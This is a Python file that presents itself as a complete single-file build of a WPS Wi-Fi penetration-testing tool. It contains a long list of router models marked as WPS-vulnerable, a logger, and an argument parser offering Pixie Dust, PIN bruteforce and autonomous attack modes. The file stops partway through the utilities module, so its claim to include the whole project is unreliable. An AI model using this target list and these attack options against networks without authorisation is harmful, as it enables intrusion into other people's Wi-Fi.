#!/usr/bin/env python3
# =============================================================================
# OneShot-Extended -- single-file build
#
# This file is a single-file assembly of the whole OneShot-Extended (WPS
# penetration testing utility) project. Every module of the original project
# (src/logger.py, src/args.py, src/utils.py, src/wifi/*.py, src/wps/*.py and
# ose.py) plus the data file vulnwsc.txt is included below in its original
# form -- not a single line or character is missing.
#
# To keep the original `from src import ...` / `import src....` statements
# working inside a single file, the `src` package and its submodules are
# recreated below as lightweight module objects whose attribute lookup falls
# back to this module's globals. The only alteration is in src/args.py: the
# default --vuln-list path was adjusted from '../vulnwsc.txt' to
# 'vulnwsc.txt' so it resolves to the same file from this merged location.
#
# Run it the same way as the original:
#     sudo python3 oneshot.py -i wlan0 -P
# =============================================================================

import sys
import types


class _SrcModule(types.ModuleType):
    """Namespace shim: `src.<pkg>.<name>` resolves against this file's globals."""

    def __getattr__(self, name):
        try:
            return globals()[name]
        except KeyError:
            raise AttributeError(name) from None


src = _SrcModule('src')
src.wifi = _SrcModule('src.wifi')
src.wps = _SrcModule('src.wps')
src.logger = _SrcModule('src.logger')
src.args = _SrcModule('src.args')
src.utils = _SrcModule('src.utils')
src.wifi.android = _SrcModule('src.wifi.android')
src.wifi.scanner = _SrcModule('src.wifi.scanner')
src.wifi.collector = _SrcModule('src.wifi.collector')
src.wps.generator = _SrcModule('src.wps.generator')
src.wps.pixiewps = _SrcModule('src.wps.pixiewps')
src.wps.connection = _SrcModule('src.wps.connection')
src.wps.bruteforce = _SrcModule('src.wps.bruteforce')

for _pkg in (src, src.wifi, src.wps):
    _pkg.__path__ = []

sys.modules['src'] = src
sys.modules['src.wifi'] = src.wifi
sys.modules['src.wps'] = src.wps
sys.modules['src.logger'] = src.logger
sys.modules['src.args'] = src.args
sys.modules['src.utils'] = src.utils
sys.modules['src.wifi.android'] = src.wifi.android
sys.modules['src.wifi.scanner'] = src.wifi.scanner
sys.modules['src.wifi.collector'] = src.wifi.collector
sys.modules['src.wps.generator'] = src.wps.generator
sys.modules['src.wps.pixiewps'] = src.wps.pixiewps
sys.modules['src.wps.connection'] = src.wps.connection
sys.modules['src.wps.bruteforce'] = src.wps.bruteforce

# -----------------------------------------------------------------------------
# Embedded copy of vulnwsc.txt (default list of vulnerable devices)
# -----------------------------------------------------------------------------
VULN_LIST_DATA = [
    'MI424-WR Rev.E',
    'WLAN 1421',
    'AirPort Extreme',
    'Vodafone Easybox 602',
    'Vodafone EasyBox 802',
    'Speedport W 504V Typ A',
    'EasyBox 803',
    'RT-N16',
    'RT-N10',
    'N13U v1&v2',
    'Fritz!box 7390',
    'Fritz!Box 7240',
    'FritzBox7390',
    'Fritz!Box WLAN 3370',
    'n150',
    'F9K1001v1',
    'F6D6230-4 v1000',
    'F9K1001v1 (N150)',
    'F7D1301 v1',
    'F7D2301 v1',
    'F9K1105 v1',
    'F9K1001 v1',
    '7800n',
    'BiPAC 7404VGPX',
    'WZR-HP-G300NH',
    'WZR-HP-AG300H',
    'Linksys E4200 v1',
    'Valet M10',
    'Linksys E4200',
    'Linksys E3200 v1',
    'WRVS4400N',
    'UC320W',
    'WAP4410N',
    'RV110W',
    'RV120W',
    'SRP521W',
    'SRP526W',
    'SRP527W',
    'SRP541W',
    'SRP546W',
    'SRP547W',
    'WRP400',
    'Linksys E1000',
    'Lynksis E3200 v1',
    'WRT320N',
    'WRT610N',
    'DIR-825',
    'DIR-615',
    'DIR-855',
    'DIR-655 vB1',
    'DIR-300 (HV - B1)',
    'DIR-300',
    'DIR-655 A3',
    'DIR-457',
    'DIR-501',
    'DIR-600',
    'DIR-615 Rev D+ H',
    'DIR-615 Rev. B',
    'DIR-635 Rev B',
    'DIR-645',
    'DIR-652',
    'DIR-655',
    'DIR-657',
    'DIR-815',
    'DIR-852',
    'DAP-1360',
    'DAP-1522',
    'DIR-625',
    'DIR-628',
    'DWA125 with Ralink2870 / 3070',
    '3G-6200nL',
    'ECB9500',
    'EchoLife HG521',
    'BtHomeHiub3',
    'E3000',
    'WRT350N',
    'E2500',
    'WRT120N',
    'WRT160Nv2',
    'E1000',
    'E1200',
    'E4200',
    'WRT54G2',
    'WRT350Nv2.1',
    'WAG160Nv2',
    'WRT100',
    'NP800n',
    'CG3100',
    'CG3100D',
    'DGND3700',
    'WNDR3700',
    'DGN1000B',
    'MBRN3000',
    'WNDR3700v3',
    'CGD24G',
    'WGR614v8',
    'WNR1000 (N150)',
    'WNR3500L',
    'WNR3500v2 (N300)',
    'WNR200V2',
    'WNDR3700v1',
    'DGND3300v2',
    'WNR3500V2',
    'F@st 3504',
    'SX763',
    'Sitecom 300N WL-363',
    'Speedport w720v',
    'Speedport W 723V',
    'TG784n',
    'TG784',
    'TG782',
    'TL-WR1043ND',
    'TL-WR2543ND',
    'TL-WR1043N',
    'TD-W8950ND',
    'TL-MR3420',
    'WR841N',
    'TL-WR841ND',
    'WR841ND',
    'TL-WR841N',
    'TL-WR740N',
    'EVW3200',
    'XWR100',
    'P-660W-T1 v3',
    'TALKTALK-F03653',
    'F9K1002',
    'WTM652',
    'SMC7901WBRA2',
    'SMCWBR14-N2',
    'F@ST2864',
    'ADSL2+ Wi-Fi N',
    'F6D4230-4 v3 (01)',
    'WNDR4500',
    'TG862G',
    'TG585 v7',
    'LW310V2',
    'SMC8014WN',
    'WAP-5813n',
    'WNR2000v3',
    'wnr2000v2',
    'F5D7234-4 v5',
    'WNDR3400v2',
    'WNDR3700V4',
    'HG256',
    'ESR300H',
    'EA4500',
    'WNDR3300',
    'WR-741nd',
    'SAMSUNG D7000',
    'Linksys E4200 V1.0',
    'WN-200R',
    'AC1200R',
    'AIP-W525h',
    'SR10000',
    'DG1670AB2',
    'TG1672',
    'TG1682G',
    'TG852G',
    'TG862A',
    'RT-AC66U',
    'RT-AC68U',
    'RT-N10E',
    'RT-N12E',
    'RT-N15',
    'RT-N56U',
    'RT-N66U',
    'SmartBox',
    'F5D8236-4',
    'F6D4230-4',
    'F7D1301',
    'F7D5301',
    'F9K1010',
    'F9K1102',
    'F9K1103',
    'F9K1105',
    'F9K1110',
    'BiPac 7800N',
    'WBMR-HP-GN',
    'DPC3939',
    'DPC3941T',
    'CBN-106-145-065',
    'CH6640E',
    'DAP 1520',
    'DIR-605L',
    'DIR-610N',
    'DIR-626L',
    'DIR-636L',
    'DSL-2740E',
    'GO-RT-N150',
    'FON 2303B',
    'ENHWI-3GN3',
    'ESR6650',
    'CGN2-ROG',
    'CGN3-ACR',
    'CGN3-ROG',
    'CVE30360',
    'HG532e',
    'HG532s',
    'HG566a',
    'Wireless 300N 3G',
    'E1700',
    'EA6350',
    'RE1000',
    'RE3000W',
    'RE6700',
    'WRT110',
    'WRT160N',
    'WRT1900AC',
    'WRT310N',
    'HGW-2501GN-R2',
    'SBG6580',
    'C3700',
    'DGN1000',
    'EX2700',
    'EX3700',
    'EX6100',
    'EX6200',
    'JNR3210',
    'PR2000',
    'R6100',
    'R6300',
    'R6900P',
    'R7000',
    'WGR614',
    'WN3000RP',
    'WN3100RP',
    'WNDR3400',
    'WNDR3800',
    'WNDR4300',
    'WNR1000',
    'WNR2000',
    '4111N',
    'WLM-4600',
    'SMCD3GNV',
    'W 921V',
    'W724V',
    'W 724V',
    'TC8305C',
    'TD5130',
    'TG-797n',
    'iRouteur 1104-W',
    'APDK71',
    'N301RT',
    'Archer C2',
    'Archer C20i',
    'Archer C5',
    'TD-W8951ND',
    'TD-W8960N',
    'TL-WA701ND',
    'TL-WDR3500',
    'TL-WR1042ND',
    'TL-WR1043',
    'TL-WR720N',
    'TL-WR841HP',
    'TEW-650AP',
    'TEW-691GR',
    'TEW-731BR',
    'ZXDSL 931VII',
    'C1000Z',
    'Keenetic',
    'NBG-418N',
    'P-2812HNU-F3',
    'P-660HN-T1A',
    'P-660W-T1',
    'PK5001z',
    'VMG3312-B10A',
    'VMG3312-B10B',
    'VMG5313-B30',
    'ADSL Router EV-2006-07-27',
    'ADSL RT2860',
    'AIR3G WSC Wireless Access Point AIR3G WSC Device',
    'AirLive Wireless Gigabit AP AirLive Wireless Gigabit AP',
    'APxx APxx-xxx',
    'Archer_A9 1.0',
    'ArcherC20i 1.0',
    'Archer A2 5.0',
    'Archer A5 4.0',
    'Archer C2 1.0',
    'Archer C2 3.0',
    'Archer C5 4.0',
    'Archer C6 3.20',
    'Archer C6U 1.0.0',
    'Archer C20 1.0',
    'Archer C20 4.0',
    'Archer C20 5.0',
    'Archer C50 1.0',
    'Archer C50 3.0',
    'Archer C50 4.0',
    'Archer C50 5.0',
    'Archer C50 6.0',
    'Archer C64',
    'Archer MR200 1.0',
    'Archer MR200 4.0',
    'Archer MR400 4.2',
    'Archer MR200 5.0',
    'Archer VR2100 1.0',
    'Archer VR300 1.20',
    'Archer VR400 3.0',
    'Archer XR500v 1.0',
    'B-LINK 123456',
    'Belkin AP EV-2012-09-01',
    'DAP-1360 DAP-1360',
    'DIR-635 B3',
    'DIR-819 v1.0.1',
    'DIR-842 DIR-842',
    'DPC3928SL',
    'DWR-921C3 WBR-0001',
    'D-Link N Router GO-RT-N150',
    'D-Link Router DIR-605L',
    'D-Link Router DIR-615H1',
    'D-Link Router DIR-655',
    'D-Link Router DIR-809',
    'D-Link Router GO-RT-N150',
    'Edimax Edimax',
    'EC120-F5 1.0',
    'EC220-G5 2.0',
    'EV-2009-02-06',
    'Enhanced Wireless Router F6D4230-4 v1',
    'Home Internet Center KEENETIC series',
    'Home Internet Center Keenetic series',
    'Huawei Wireless Access Point RT2860',
    'JWNR2000v2(Wireless AP) JWNR2000v2',
    'Keenetic Keenetic series',
    'Linksys E5400 E5400',
    'Linksys Wireless Access Point E5600',
    'Linksys Wireless Access Point EA7500',
    'Linksys Wireless Router WRT110',
    'NBG-419N NBG-419N',
    'Netgear AP EV-2012-08-04',
    'NETGEAR Wireless Access Point NETGEAR',
    'NETGEAR Wireless Access Point R6220',
    'NETGEAR Wireless Access Point R6260',
    'N/A EV-2010-09-20',
    'Ralink Wireless Access Point E5600',
    'Ralink Wireless Access Point RT2860',
    'Ralink Wireless Access Point WR-AC1210',
    'RTL8196E',
    'RTL8xxx EV-2009-02-06',
    'RTL8xxx EV-2010-09-20',
    'RTL8xxx RTK_ECOS',
    'RT-G32 1234',
    'Sitecom Wireless Router 300N X2 300N',
    'Smart Router R3 RT2860',
    'Tenda 123456',
    'Timo RA300R4 Timo RA300R4',
    'TD-W8151N RT2860',
    'TD-W8901N RT2860',
    'TD-W8951ND RT2860',
    'TD-W9960 1.0',
    'TD-W9960 1.20',
    'TD-W9960v 1.0',
    'TD-W8968 2.0',
    'TEW-731BR TEW-731BR',
    'TG862G RT2860',
    'TL-MR100 1.0',
    'TL-MR3020 3.0',
    'TL-MR3420 5.0',
    'TL-MR6400 3.0',
    'TL-MR6400 4.0',
    'TL-WA801N 6.0',
    'TL-WA855RE 4.0',
    'TL-WR840N 4.0',
    'TL-WR840N 5.0',
    'TL-WR840N 6.0',
    'TL-WR841N 13.0',
    'TL-WR841N 14.0',
    'TL-WR841HP 5.0',
    'TL-WR842N 5.0',
    'TL-WR845N 3.0',
    'TL-WR845N 4.0',
    'TL-WR850N 1.0',
    'TL-WR850N 2.0',
    'TL-WR850N 3.0',
    'TL-WR1042N EV-2010-09-20',
    'Topaz QV840.432',
    'Trendnet router TEW-625br',
    'Trendnet router TEW-651br',
    'VN020-F3 1.0',
    'VMG3312-T20A RT2860',
    'VMG8623-T50A RT2860',
    'WAP300N WAP300N',
    'WAP3205 WAP3205',
    'Wi-Fi Protected Setup Router RT-AC1200G+',
    'Wi-Fi Protected Setup Router RT-AX55',
    'Wi-Fi Protected Setup Router RT-N10U',
    'Wi-Fi Protected Setup Router RT-N12',
    'Wi-Fi Protected Setup Router RT-N12D1',
    'Wi-Fi Protected Setup Router RT-N12VP',
    'Wireless Access Point .',
    'Wireless Router 123456',
    'Wireless Router RTL8xxx EV-2009-02-06',
    'Wireless Router Wireless Router',
    'Wireless WPS Router',
    'Wireless WPS Router RT-N10E',
    'Wireless WPS Router RT-N10LX',
    'Wireless WPS Router RT-N12E',
    'Wireless WPS Router RT-N12LX',
    'WN3000RP V3',
    'WN-200R WN-200R',
    'WPS Router RT-N65U',
    'WPS Router DSL-AC51',
    'WPS Router DSL-AC52U',
    'WPS Router DSL-AC55U',
    'WPS Router DSL-N14U-B1',
    'WPS Router DSL-N16',
    'WPS Router DSL-N17U',
    'WPS Router RT-AC750',
    'WPS Router RT-AC1200',
    'WPS Router RT-AC1200_V2',
    'WPS Router RT-AC1750',
    'WPS Router RT-AC750L',
    'WPS Router RT-AC1750U',
    'WPS Router RT-AC51',
    'WPS Router RT-AC51U',
    'WPS Router RT-AC52U',
    'WPS Router RT-AC52U_B1',
    'WPS Router RT-AC53',
    'WPS Router RT-AC57U',
    'WPS Router RT-AC65P',
    'WPS Router RT-AC85P',
    'WPS Router RT-N11P',
    'WPS Router RT-N12E',
    'WPS Router RT-N12E_B1',
    'WPS Router RT-N12 VP',
    'WPS Router RT-N12+',
    'WPS Router RT-N14U',
    'WPS Router RT-N56U',
    'WPS Router RT-N56UB1',
    'WPS Router RT-N300',
    'WR5570 2011-05-13',
    'XC220-G3v 1.0',
    'XN020-G3v 1.0',
    'ZyXEL NBG-416N AP Router',
    'ZyXEL NBG-416N AP Router NBG-416N',
    'ZyXEL NBG-418N AP Router',
    'ZyXEL NBG-418N AP Router NBG-418N',
    'ZyXEL Wireless AP Router NBG-417N',
    'AirLive\tWN-200R',
    'Alfa Network AC1200R',
    'Alfa Network AIP-W525h',
    'Amped Wireless SR10000',
    'Arris DG1670AB2',
    'Arris TG1672',
    'Arris TG1682G',
    'Arris TG852G',
    'Arris TG862A',
    'Arris TG862G',
    'Asus RT-AC66U',
    'Asus RT-AC68U',
    'Asus RT-N10E',
    'Asus RT-N12E',
    'Asus RT-N15',
    'Asus RT-N56U',
    'Asus RT-N66U',
    'Beelin SmartBox',
    'Belkin F5D8236-4',
    'Belkin F6D4230-4',
    'Belkin F7D1301',
    'Belkin F7D5301',
    'Belkin F9K1010',
    'Belkin F9K1102',
    'Belkin F9K1103',
    'Belkin F9K1105',
    'Belkin F9K1110',
    'Billion\tBiPac 7800N',
    'Buffalo\tWBMR-HP-GN',
    'Cisco DPC3939',
    'Cisco DPC3941T',
    'Compal CBN-106-145-065',
    'Compal CH6640E',
    'D-Link DAP 1520',
    'D-Link DIR-501',
    'D-Link DIR-605L',
    'D-Link DIR-610N',
    'D-Link DIR-615',
    'D-Link DIR-626L',
    'D-Link DIR-636L',
    'D-Link DIR-655',
    'D-Link DSL-2740E',
    'D-Link GO-RT-N150',
    'Edimax FON 2303B',
    'Encore ENHWI-3GN3',
    'EnGenius ESR6650',
    'Hitron CGN2-ROG',
    'Hitron CGN3-ACR',
    'Hitron CGN3-ROG',
    'Hitron CVE30360',
    'Huawei HG532e',
    'Huawei HG532s',
    'Huawei HG566a',
    'Intellinet Wireless 300N 3G',
    'Linksys\tE1700',
    'Linksys\tE2500',
    'Linksys\tEA6350',
    'Linksys\tRE1000',
    'Linksys\tRE3000W',
    'Linksys\tRE6700',
    'Linksys\tWRT110',
    'Linksys\tWRT160N',
    'Linksys\tWRT1900AC',
    'Linksys\tWRT310N',
    'Mitrastar HGW-2501GN-R2',
    'Motorola SBG6580',
    'NETGEAR\tC3700',
    'NETGEAR\tDGN1000',
    'NETGEAR\tEX2700',
    'NETGEAR\tEX3700',
    'NETGEAR\tEX6100',
    'NETGEAR\tEX6200',
    'NETGEAR\tJNR3210',
    'NETGEAR\tPR2000',
    'NETGEAR\tR6100',
    'NETGEAR\tR6300',
    'NETGEAR\tR6900P',
    'NETGEAR\tR7000',
    'NETGEAR\tWGR614',
    'NETGEAR\tWN3000RP',
    'NETGEAR\tWN3100RP',
    'NETGEAR\tWNDR3400',
    'NETGEAR\tWNDR3700',
    'NETGEAR\tWNDR3800',
    'NETGEAR\tWNDR4300',
    'NETGEAR\tWNR1000',
    'NETGEAR\tWNR2000',
    'Pace 4111N',
    'Sitecom\tWLM-4600',
    'SMC\tSMCD3GNV',
    'Speedport W 921V',
    'Speedport W724V',
    'Speedport W 724V',
    'Technicolor\tTC8305C',
    'Technicolor\tTD5130',
    'Technicolor\tTG-797n',
    'Teldat iRouteur 1104-W',
    'TI APDK71',
    'Totolink N301RT',
    'TP-Link\tArcher C2',
    'TP-Link\tArcher C20i',
    'TP-LInk\tArcher C5',
    'TP-Link\tTD-W8951ND',
    'TP-Link\tTD-W8960N',
    'TP-Link\tTL-WA701ND',
    'TP-Link\tTL-WDR3500',
    'TP-Link\tTL-WR1042ND',
    'TP-Link\tTL-WR1043',
    'TP-Link\tTL-WR1043ND',
    'TP-Link\tTL-WR720N',
    'TP-Link\tTL-WR740N',
    'TP-Link\tTL-WR841HP',
    'TP-Link\tTL-WR841N',
    'TRENDnet TEW-650AP',
    'TRENDnet TEW-691GR',
    'TRENDnet TEW-731BR',
    'ZTE\tZXDSL 931VII',
    'ZyXEL C1000Z',
    'ZyXEL Keenetic',
    'ZyXEL NBG-418N',
    'ZyXEL P-2812HNU-F3',
    'ZyXEL P-660HN-T1A',
    'ZyXEL P-660W-T1',
    'ZyXEL PK5001z',
    'ZyXEL VMG3312-B10A',
    'ZyXEL VMG3312-B10B',
    'ZyXEL VMG5313-B30',
    'TP-Link Archer_A9 1.0',
    'TP-Link Archer A2 5.0',
    'TP-Link Archer A5 4.0',
    'TP-Link Archer C2 1.0',
    'TP-Link Archer C2 3.0',
    'TP-Link Archer C5 4.0',
    'TP-Link Archer C6U 1.0.0',
    'TP-Link Archer C20 1.0',
    'TP-Link Archer C20 4.0',
    'TP-Link Archer C20 5.0',
    'TP-Link Archer C50 1.0',
    'TP-Link Archer C50 3.0',
    'TP-Link Archer C50 4.0',
    'TP-Link Archer C50 5.0',
    'TP-Link Archer C50 6.0',
    'TP-Link Archer MR200 1.0',
    'TP-Link Archer MR200 4.0',
    'TP-Link Archer MR200 5.0',
    'TP-Link Archer VR300 1.20',
    'TP-Link Archer VR400 3.0',
    'TP-Link TD-W8151N RT2860',
    'TP-Link TD-W8901N RT2860',
    'TP-Link TD-W8951ND RT2860',
    'TP-Link TD-W9960 1.0',
    'TP-Link TD-W9960 1.20',
    'TP-Link TD-W9960v 1.0',
    'TP-Link TD-W8968 2.0',
    'TP-Link TL-MR3020 3.0',
    'TP-Link TL-MR3420 5.0',
    'TP-Link TL-MR6400 3.0',
    'TP-Link TL-MR6400 4.0',
    'TP-Link TL-WA855RE 4.0',
    'TP-Link TL-WR840N 4.0',
    'TP-Link TL-WR840N 5.0',
    'TP-Link TL-WR840N 6.0',
    'TP-Link TL-WR841N 13.0',
    'TP-Link TL-WR841N 14.0',
    'TP-Link TL-WR841HP 5.0',
    'TP-Link TL-WR842N 5.0',
    'TP-Link TL-WR845N 3.0',
    'TP-Link TL-WR845N 4.0',
    'TP-Link TL-WR850N 1.0',
    'TP-Link TL-WR850N 2.0',
    'TP-Link TL-WR850N 3.0',
    'TP-Link TL-WR1042N EV-2010-09-20',
    'Modem/Router EV-2010-09-20',
    'RB06 RT2860',
    'RB03 RT2860',
]


# ============================================================================
# SOURCE: src/logger.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import logging
import sys

_LOGGER = None

class _ColorFormatter(logging.Formatter):
    """Custom formatter that adds colored log level prefixes"""

    COLORS = {
        '[*]': '\033[0;32m',  # Dark Green
        '[+]': '\033[1;32m',  # Bold Green
        '[-]': '\033[1;33m',  # Bold Yellow
        '[!]': '\033[1;31m',  # Bold Red
        'RESET': '\033[0m'
    }

    LEVEL_PREFIXES = {
        logging.INFO: '[*]',
        logging.WARNING: '[-]',
        logging.ERROR: '[!]',
        logging.CRITICAL: '[!]',
    }

    def format(self, record):
        msg_str = str(record.msg)

        prefix = self.LEVEL_PREFIXES.get(record.levelno, '[*]')
        for pfx in ['[*]', '[+]', '[-]', '[!]']:
            if msg_str.startswith(pfx):
                prefix = pfx
                record.msg = msg_str[len(pfx):].lstrip()
                break

        color = self.COLORS.get(prefix, '')
        reset = self.COLORS['RESET']
        record.msg = f"{color}{prefix}{reset} {record.msg}"

        return super().format(record)

def _getLogger(name: str = __name__, level: int = logging.INFO) -> logging.Logger:
    """Get a configured logger instance"""

    logger = logging.getLogger(name)

    if not logger.handlers:
        logger.setLevel(level)

        handler = logging.StreamHandler(sys.stdout)
        handler.setLevel(level)

        formatter = _ColorFormatter(fmt='%(message)s')
        handler.setFormatter(formatter)

        logger.addHandler(handler)

    return logger

def initializeLogging():
    """Initialize the global logging system"""

    global _LOGGER # pylint: disable=global-statement

    _LOGGER = _getLogger('ose', logging.INFO)

def info(message: str):
    """Log an info message"""

    if _LOGGER is None:
        initializeLogging()

    _LOGGER.info(message)

def success(message: str):
    """Log a success message (uses [+] prefix)"""

    if _LOGGER is None:
        initializeLogging()

    # We need to manually add [+] since logging doesn't have a SUCCESS level
    _LOGGER.info('[+] %s', message)

def warning(message: str):
    """Log a warning message"""

    if _LOGGER is None:
        initializeLogging()

    _LOGGER.warning(message)

def error(message: str):
    """Log an error message"""

    if _LOGGER is None:
        initializeLogging()

    _LOGGER.error(message)


# ============================================================================
# SOURCE: src/args.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import argparse
import os
import threading

def parseArgs():
    """Parse arguments passed to the main python script."""

    parser = argparse.ArgumentParser(
        description='''
▄▖    ▄▖▌   ▗   ▄▖  ▗      ▌   ▌
▌▌▛▌█▌▚ ▛▌▛▌▜▘▄▖▙▖▚▘▜▘█▌▛▌▛▌█▌▛▌
▙▌▌▌▙▖▄▌▌▌▙▌▐▖  ▙▖▞▖▐▖▙▖▌▌▙▌▙▖▙▌

Copyright (C) 2026 chkndrp
''',
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False
    )

    target_group = parser.add_argument_group('Required arguments')
    target_group.add_argument(
        '-i', '--interface',
        type=str,
        help='Name of the interface to use'
    )
    target_group.add_argument(
        '-b', '--bssid',
        type=str,
        help='BSSID of the target AP'
    )

    check_group = parser.add_argument_group('Check Mode (no attack)')
    check_group.add_argument(
        '-C', '--check',
        type=str,
        metavar='BSSID',
        help='Check a router BSSID/MAC against the vulnerable lists and saved data (add -i to also probe the AP over the air), without running any attack'
    )

    attack_group = parser.add_argument_group('Attack Modes')
    attack_pin_group = attack_group.add_mutually_exclusive_group()
    attack_pin_group.add_argument(
        '-p', '--pin',
        type=str,
        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
    )
    attack_pin_group.add_argument(
        '-N', '--null-pin',
        action='store_true',
        help='Use a null pin'
    )
    attack_pin_group.add_argument(
        '-P', '--pixie-dust',
        action='store_true',
        help='Run Pixie Dust attack'
    )
    attack_pin_group.add_argument(
        '-B', '--bruteforce',
        action='store_true',
        help='Run online bruteforce attack'
    )
    attack_pin_group.add_argument(
        '--pbc', '--push-button-connect',
        action='store_true',
        help='Run WPS push button connection'
    )

    opt_group = parser.add_argument_group('Optional arguments')
    opt_group.add_argument(
        '-k', '--kill',
        action='store_true',
        help='Automatically kill processes interfering with the wireless interface'
    )
    opt_group.add_argument(
        '-r', '--restore',
        action='store_true',
        help='Restore killed interfering processes on exit (--kill)'
    )
    opt_group.add_argument(
        '-w', '--write',
        action='store_true',
        help='Write credentials to the file on success'
    )
    opt_group.add_argument(
        '-l', '--loop',
        action='store_true',
        help='Run in a loop'
    )
    opt_group.add_argument(
        '-c', '--clear',
        action='store_true',
        help='Clear the screen on every wi-fi scan'
    )
    opt_group.add_argument(
        '-a', '--all',
        action='store_true',
        help='Show all networks in the scan table, including those with WPS disabled/absent (marked gray as OFF)'
    )
    opt_group.add_argument(
        '--ai',
        action='store_true',
        help='Full AI autonomous mode: scan -> list -> select -> AI decides attack chain'
    )
    opt_group.add_argument(
        '-d', '--delay',
        type=float,
        default=0,
        help='Set a delay between pin attempts in seconds (default: %(default)s)'
    )
    opt_group.add_argument(
        '-t', '--timeout',
        type=float,
        default=60,
        help='Set the timeout for retrying after WPS lock (default: %(default)s)'
    )

    adv_group = parser.add_argument_group('Advanced Arguments')
    adv_group.add_argument(
        '-F', '--pixie-force',
        action='store_true',
        help='Run Pixiewps with --force option (bruteforce full range)'
    )
    adv_group.add_argument(
        '-S', '--show-pixie',
        action='store_true',
        help='Print pixiewps command and related data'
    )
    adv_group.add_argument(
        '-I', '--iface-down',
        action='store_true',
        help='Down network interface when the work is finished'
    )
    adv_group.add_argument(
        '-M', '--mtk-wifi',
        action='store_true',
        help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit'
    )
    adv_group.add_argument(
        '-D', '--dont-touch-settings',
        action='store_true',
        help="Don't touch the Android Wi-Fi settings on startup and exit"
    )
    adv_group.add_argument(
        '--install',
        action='store_true',
        help='Install wifi4 + oneshot globally to /usr/local/bin'
    )
    adv_group.add_argument(
        '--export',
        action='store_true',
        help='Export training data to training_data_<date>.json for sharing'
    )
    adv_group.add_argument(
        '--import-data',
        type=str,
        metavar='FILE',
        help='Import training observations from a shared JSON file'
    )
    adv_group.add_argument(
        '--pull-model',
        action='store_true',
        help='Download and merge the latest community model from GitHub'
    )
    adv_group.add_argument(
        '--push-model',
        action='store_true',
        help='Commit and push your trained model back to GitHub (requires git credentials / GITHUB_TOKEN env)'
    )
    adv_group.add_argument(
        '--profile',
        type=str,
        choices=['conservative', 'balanced', 'aggressive'],
        default='balanced',
        help='A/B training persona: conservative | balanced | aggressive (default: balanced)'
    )
    adv_group.add_argument(
        '--sync',
        action='store_true',
        help='Full community sync: push local data -> pull community data -> auto-train -> git push'
    )
    adv_group.add_argument(
        '--push-data',
        action='store_true',
        help='Only upload local training data to Supabase (no pull/train)'
    )
    adv_group.add_argument(
        '--pull-data',
        action='store_true',
        help='Only download community data and merge into model'
    )
    adv_group.add_argument(
        '--reverse-scan',
        action='store_true',
        help='Reverse order of networks in the list of networks. Useful on small displays'
    )
    adv_group.add_argument(
        '--vuln-list',
        type=str,
        default=os.path.join(os.path.dirname(__file__), 'vulnwsc.txt'),
        help='Use custom file with vulnerable devices list'
    )
    adv_group.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Verbose output'
    )
    adv_group.add_argument(
        '-h', '--help',
        action='help',
        help='Show this help message and exit'
    )

    args = parser.parse_args()

    if not args.check and not args.interface and not getattr(args, 'ai', False) and not getattr(args, 'install', False) \
       and not getattr(args, 'export', False) and not getattr(args, 'pull_model', False) \
       and not getattr(args, 'push_model', False) and not getattr(args, 'import_data', None) \
       and not getattr(args, 'sync', False) and not getattr(args, 'push_data', False) \
       and not getattr(args, 'pull_data', False):
        parser.error('argument -i/--interface is required')

    if (args.pixie_force or args.show_pixie) and not args.pixie_dust:
        parser.error('argument -F/--pixie-force and -S/--show-pixie can only be used with -P/--pixie-dust')

    if args.delay and not args.bruteforce:
        parser.error('argument -d/--delay can only be used with -B/--bruteforce')

    if args.restore and not args.kill:
        parser.error('argument -r/--restore can only be used with -k/--kill')

    return args


# ============================================================================
# SOURCE: src/utils.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import sys
import os
import json
import pathlib
import subprocess
import time

from shutil import which
from src import logger

USER_HOME = str(pathlib.Path.home())
SESSIONS_DIR = f'{USER_HOME}/.OneShot-Extended/sessions/'
PIXIEWPS_DIR = f'{USER_HOME}/.OneShot-Extended/pixiewps/'
REPORTS_DIR  = f'{os.getcwd()}/reports/'

def _getInterferingProcesses():
    """Get a list of processes actively using the generic netlink subsystem."""

    try:
        with open('/proc/net/netlink', 'r', encoding='utf-8') as f:
            next(f)

            tokens = (line.split() for line in f)
            pids = {int(p[2]) for p in tokens if len(p) > 2 and p[1] == '16'}

            pids.discard(os.getpid())
    except IOError:
        return []

    interfering_pids = []
    for pid in pids:
        try:
            fd_entries = os.scandir(f'/proc/{pid}/fd')
            has_socket = any('socket' in os.readlink(e.path) for e in fd_entries)

            if has_socket:
                with open(f'/proc/{pid}/comm', 'r', encoding='utf-8') as f_comm:
                    pname = f_comm.read().strip()

                    # Killing system_server results in soft reboot
                    if pname == 'system_server':
                        continue

                    interfering_pids.append((pid, pname))
        except OSError:
            continue

    return interfering_pids

def _saveKilledProcesses(processes: list[tuple[int, str, str]]):
    """Save killed process information to a file for restoration."""

    if not processes:
        return

    try:
        killed_file = os.path.join(SESSIONS_DIR, 'killed_processes.json')

        with open(killed_file, 'w', encoding='utf-8') as f:
            json.dump(processes, f, indent=2)
    except IOError as e:
        logger.error(f"Failed to save killed processes: {e}")

